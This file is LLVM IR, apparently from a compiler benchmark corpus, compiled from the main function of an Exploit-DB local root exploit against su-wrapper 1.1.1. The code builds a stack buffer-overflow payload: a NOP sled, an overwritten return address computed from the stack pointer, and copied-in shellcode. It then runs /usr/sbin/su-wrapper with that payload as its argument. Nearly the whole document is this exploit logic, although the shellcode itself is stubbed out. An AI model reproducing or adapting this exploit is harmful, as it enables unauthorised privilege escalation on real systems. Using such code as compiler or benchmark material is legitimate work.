; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20906.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20906.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFFERSIZE = common dso_local global i32 0, align 4
@OFFSET = common dso_local global i32 0, align 4
@ALIGN = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [67 x i8] c"=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\0A\00", align 1
@.str.1 = private unnamed_addr constant [41 x i8] c"[x] su-wrapper 1.1.1 local root exploit\0A\00", align 1
@.str.2 = private unnamed_addr constant [67 x i8] c"[x] dex: - dexgod@softhome.net <> http://www.raza-mexicana.org - \0A\00", align 1
@.str.3 = private unnamed_addr constant [68 x i8] c"=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [45 x i8] c"[x] Address = 0x%x, Align = %d, Offset = %d\0A\00", align 1
@.str.5 = private unnamed_addr constant [19 x i8] c"[x] Exploiting...\0A\00", align 1
@.str.6 = private unnamed_addr constant [21 x i8] c"/usr/sbin/su-wrapper\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"su-wrapper\00", align 1
@.str.8 = private unnamed_addr constant [58 x i8] c"Could not start su-wrapper, /usr/sbin/su-wrapper exists?\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %11 = load i32, i32* @BUFFERSIZE, align 4
  store i32 %11, i32* %8, align 4
  %12 = load i32, i32* @OFFSET, align 4
  store i32 %12, i32* %9, align 4
  %13 = load i32, i32* @ALIGN, align 4
  store i32 %13, i32* %10, align 4
  %14 = load i32, i32* %3, align 4
  %15 = icmp sgt i32 %14, 1
  br i1 %15, label %16, label %21

16:                                               ; preds = %2
  %17 = load i8**, i8*** %4, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 1
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @atoi(i8* %19)
  store i32 %20, i32* %9, align 4
  br label %21

21:                                               ; preds = %16, %2
  %22 = load i32, i32* %3, align 4
  %23 = icmp sgt i32 %22, 2
  br i1 %23, label %24, label %29

24:                                               ; preds = %21
  %25 = load i8**, i8*** %4, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 2
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @atoi(i8* %27)
  store i32 %28, i32* %10, align 4
  br label %29

29:                                               ; preds = %24, %21
  %30 = load i32, i32* %3, align 4
  %31 = icmp sgt i32 %30, 3
  br i1 %31, label %32, label %37

32:                                               ; preds = %29
  %33 = load i8**, i8*** %4, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 3
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @atoi(i8* %35)
  store i32 %36, i32* %8, align 4
  br label %37

37:                                               ; preds = %32, %29
  %38 = load i32, i32* %8, align 4
  %39 = add nsw i32 %38, 8
  %40 = call i64 @malloc(i32 %39)
  %41 = inttoptr i64 %40 to i8*
  store i8* %41, i8** %7, align 8
  %42 = call i32 (...) @get_sp()
  %43 = load i32, i32* %9, align 4
  %44 = sub nsw i32 %42, %43
  %45 = sext i32 %44 to i64
  store i64 %45, i64* %6, align 8
  store i32 0, i32* %5, align 4
  br label %46

46:                                               ; preds = %56, %37
  %47 = load i32, i32* %5, align 4
  %48 = load i32, i32* %8, align 4
  %49 = icmp slt i32 %47, %48
  br i1 %49, label %50, label %59

50:                                               ; preds = %46
  %51 = load i8*, i8** %7, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = bitcast i8* %54 to i64*
  store i64 2425393296, i64* %55, align 8
  br label %56

56:                                               ; preds = %50
  %57 = load i32, i32* %5, align 4
  %58 = add nsw i32 %57, 4
  store i32 %58, i32* %5, align 4
  br label %46

59:                                               ; preds = %46
  %60 = load i64, i64* %6, align 8
  %61 = load i8*, i8** %7, align 8
  %62 = load i32, i32* %8, align 4
  %63 = sub nsw i32 %62, 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8, i8* %61, i64 %64
  %66 = bitcast i8* %65 to i64*
  store i64 %60, i64* %66, align 8
  %67 = load i64, i64* %6, align 8
  %68 = load i8*, i8** %7, align 8
  %69 = load i32, i32* %8, align 4
  %70 = sub nsw i32 %69, 8
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i8, i8* %68, i64 %71
  %73 = bitcast i8* %72 to i64*
  store i64 %67, i64* %73, align 8
  %74 = load i8*, i8** %7, align 8
  %75 = load i32, i32* %8, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %74, i64 %76
  %78 = getelementptr inbounds i8, i8* %77, i64 -8
  %79 = load i32, i32* @shellcode, align 4
  %80 = call i8* @strlen(i32 %79)
  %81 = ptrtoint i8* %78 to i64
  %82 = ptrtoint i8* %80 to i64
  %83 = sub i64 %81, %82
  %84 = load i32, i32* %10, align 4
  %85 = sext i32 %84 to i64
  %86 = sub nsw i64 %83, %85
  %87 = trunc i64 %86 to i32
  %88 = load i32, i32* @shellcode, align 4
  %89 = load i32, i32* @shellcode, align 4
  %90 = call i8* @strlen(i32 %89)
  %91 = call i32 @memcpy(i32 %87, i32 %88, i8* %90)
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str, i64 0, i64 0))
  %93 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.1, i64 0, i64 0))
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.2, i64 0, i64 0))
  %95 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.3, i64 0, i64 0))
  %96 = load i64, i64* %6, align 8
  %97 = load i32, i32* %10, align 4
  %98 = load i32, i32* %9, align 4
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.4, i64 0, i64 0), i64 %96, i32 %97, i32 %98)
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.3, i64 0, i64 0))
  %101 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0))
  %102 = load i8*, i8** %7, align 8
  %103 = call i64 @execl(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i64 0, i64 0), i8* %102, i32* null)
  %104 = icmp ne i64 %103, 0
  br i1 %104, label %105, label %107

105:                                              ; preds = %59
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.8, i64 0, i64 0))
  br label %107

107:                                              ; preds = %105, %59
  ret void
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @memcpy(i32, i32, i8*) #1

declare dso_local i8* @strlen(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @execl(i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
